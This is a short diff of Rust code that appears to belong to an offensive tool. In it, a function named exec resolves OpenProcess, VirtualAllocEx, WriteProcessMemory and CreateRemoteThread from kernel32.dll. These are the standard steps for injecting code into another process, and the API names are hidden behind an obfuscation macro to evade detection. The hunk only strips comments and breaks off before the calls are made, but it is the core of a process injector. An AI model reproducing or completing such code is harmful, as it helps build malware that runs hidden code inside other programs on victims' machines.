@@ -7,27 +7,22 @@ pub unsafe fn exec(p: usize, size: usize, pid: usize) -> Result<(), String> {
 
     let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
 
-    // OpenProcess
     let p_open_process = get_proc_address(kernel32, obf_lit_bytes!(b"OpenProcess\0").as_slice())?;
     type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
     let open_process: OpenProcessFn = transmute(p_open_process);
 
-    // VirtualAllocEx
     let p_virtual_alloc_ex = get_proc_address(kernel32, obf_lit_bytes!(b"VirtualAllocEx\0").as_slice())?;
     type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
     let virtual_alloc_ex: VirtualAllocExFn = transmute(p_virtual_alloc_ex);
 
-    // WriteProcessMemory
     let p_write_process_memory = get_proc_address(kernel32, obf_lit_bytes!(b"WriteProcessMemory\0").as_slice())?;
     type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
     let write_process_memory: WriteProcessMemoryFn = transmute(p_write_process_memory);
 
-    // CreateRemoteThread
     let p_create_remote_thread = get_proc_address(kernel32, obf_lit_bytes!(b"CreateRemoteThread\0").as_slice())?;
     type CreateRemoteThreadFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *mut c_void, u32, *mut u32) -> *mut c_void;
     let create_remote_thread: CreateRemoteThreadFn = transmute(p_create_remote_thread);
 
-    // CloseHandle
     let p_close_handle = get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice())?;
     type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
     let close_handle: CloseHandleFn = transmute(p_close_handle);
